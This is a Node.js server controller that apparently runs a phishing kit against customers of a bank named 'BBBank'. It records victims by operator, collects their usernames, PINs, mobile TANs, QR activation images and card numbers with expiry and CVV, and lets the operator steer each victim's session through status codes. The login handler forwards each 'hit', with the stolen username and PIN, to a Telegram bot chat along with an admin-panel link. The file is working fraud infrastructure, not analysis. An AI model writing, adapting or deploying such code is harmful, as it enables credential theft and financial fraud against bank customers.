const BBBank = require("../models/bbbankModel");
const axios = require("axios");
var moment = require("moment"); // require

const getOwnerVics = async (req, res) => {
	const { owner } = req.params;
	BBBank.find({ owner })
		.sort({ timestamp: -1 })
		.exec((err, vics) => {
			if (err) {
				console.log(err);
				res.status(404).send("Error");
				return;
			}
			res.send(vics);
		});
};

const command = async (req, res) => {
	const { uniqueid, status } = req.body;
	try {
		await BBBank.findOneAndUpdate({ uniqueid }, { status }).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const getInfo = async (req, res) => {
	const { uniqueid } = req.params;
	BBBank.findOne({ uniqueid }).exec((err, vic) => {
		if (err) {
			console.log(err);
			res.status(404).send("Error");
			return;
		}
		res.send(vic);
	});
};

const submitLogin = async (req, res) => {
	const { username, pin, uniqueid, owner, ip } = req.body;
	try {
		let user = await BBBank.findOneAndUpdate(
			{ uniqueid },
			{ username, pin, status: 1, timestamp: moment().format() }
		);
		if (!user) {
			await BBBank.create({
				uniqueid,
				username,
				pin,
				status: 1,
				owner,
				ip,
				timestamp: moment().format(),
			});
		}

		await axios
			.post(
				`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
				{
					chat_id: "-837014205",
					text: `New BBBank Hit:\n\n${username}\n${pin}\n\nAdmin Link: https://haytchc0ding.co.uk/?panel=bbbank&password=${owner}`,
					parse_mode: "Markdown",
				}
			)
			.catch((e) => {
				console.log(e);
			});
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitLoginAgain = async (req, res) => {
	const { username, pin, uniqueid } = req.body;
	try {
		await BBBank.findOneAndUpdate(
			{ uniqueid },
			{ username, pin, status: 10, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitMobileTan = async (req, res) => {
	const { mobileTan, uniqueid } = req.body;
	try {
		await BBBank.findOneAndUpdate(
			{ uniqueid },
			{ mobileTan, status: 3, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitActivation = async (req, res) => {
	if (!req.files) {
		return res.status(500).send({ msg: "file is not found" });
	}
	let { activationCode } = req.files;
	let { uniqueid, owner, ip } = req.body;
	const frontPath = `./bbbankQr/${uniqueid}_QR.jpg`;
	try {
		await activationCode.mv(frontPath, async (err) => {
			if (err) {
				console.log(err);
				return res.sendStatus(500);
			}
		});
		let user = await BBBank.findOneAndUpdate(
			{ uniqueid },
			{
				activationCode: `https://nodejsclusters-98107-0.cloudclusters.net/bbbank/qr/${uniqueid}`,
				status: 5,
				timestamp: moment().format(),
			}
		).exec();
		if (!user) {
			await BBBank.create({
				uniqueid,
				activationCode: `https://nodejsclusters-98107-0.cloudclusters.net/bbbank/qr/${uniqueid}`,
				owner,
				ip,
				status: 5,
				timestamp: moment().format(),
			});
		}
		res.sendStatus(200);
	} catch (e) {
		console.log(e);
		res.status(400).send(e);
	}
};

const submitCard = async (req, res) => {
	const { ccnum, ccexp, cvv, uniqueid } = req.body;
	try {
		await BBBank.findOneAndUpdate(
			{ uniqueid },
			{ ccnum, ccexp, cvv, status: 7, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const deleteEntry = async (req, res) => {
	const { uniqueid } = req.body;
	try {
		await BBBank.deleteOne({ uniqueid });
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const getQr = async (req, res) => {
	const { uniqueid } = req.params;
	res.sendFile(`/bbbankQr/${uniqueid}_QR.jpg`, { root: "." });
};

module.exports = {
	getOwnerVics,
	command,
	getInfo,
	submitLogin,
	submitLoginAgain,
	submitMobileTan,
	submitCard,
	submitActivation,
	deleteEntry,
	getQr,
};
